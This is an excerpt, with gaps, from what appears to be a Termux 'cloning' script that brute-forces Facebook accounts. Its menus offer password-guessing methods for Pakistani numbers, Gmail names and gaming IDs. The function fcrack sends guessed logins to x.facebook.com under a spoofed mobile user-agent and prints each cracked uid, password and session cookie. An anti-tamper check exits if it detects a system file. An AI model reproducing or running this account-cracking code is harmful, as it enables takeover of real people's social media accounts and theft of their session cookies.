...
try:
    ...
    def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           ...
           system('clear');print('System Modification Not Allowed since using SAADU');exit()
...
def BALOCH ():
	os.system("clear")
	print(logo)
	print('[1] \033[1;97mRandom Pak Cloning')
	print('[2] \033[1;97mGmail Cloning')
	print('[3] \033[1;97mContact Admin')
	print('[0] \033[1;37mExit ') 
...
def menu():
	os.system('clear')
	print(logo)
	print('[1] \033[1;37mMETHOD 7 DIGIT')
	print('[2] \033[1;37mMETHOD ALI+KHAN PASS')
	print('[3] \033[1;37mMETHOD BALOCH PASS')
	print('[4] \033[1;37mMETHOD PUBG IDS')
	print('[5] \033[1;37mMETHOD FREE FIRE IDS')
	print('[0] \033[1;37mEXIT TO MAIN MENU')
	lines()
	opt = input('[+] CHOOSE: ')
	if opt =='1':
		svn_digit()
		...
		print('\n\033[1;37m[+] CHOOSE CORRECT OPTION! \033[0;92m')
		time.sleep(2)
		menu()
...
def gmail():
    ...
    os.system('clear')
    print(logo)
    print("[+] FIRST NAME EXAMPLE : malik,khan...etc \n[+] LAST NAME EXAMPLE : muskan,ayesha...etc");lines()
...
def fcrack(uid,pwx,tl):
   ...
   'authority': 'x.facebook.com',
    ...
    'user-agent':'Mozilla/5.0 (Linux; Android 12; SM-M426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;92m[ASIF] '+uid+'|'+ps+'\033[0;97m\n[‎‎Happy]\033[0;94m [\033[0;0mCOOKIE\033[0;97m] \033[1;97m'+coki+  '  ''  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\x1b[1;97m [\033[1;97mASIF😈\033[1;97m] %s|\x1b[1;92mOK: %s \x1b[1;97m\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
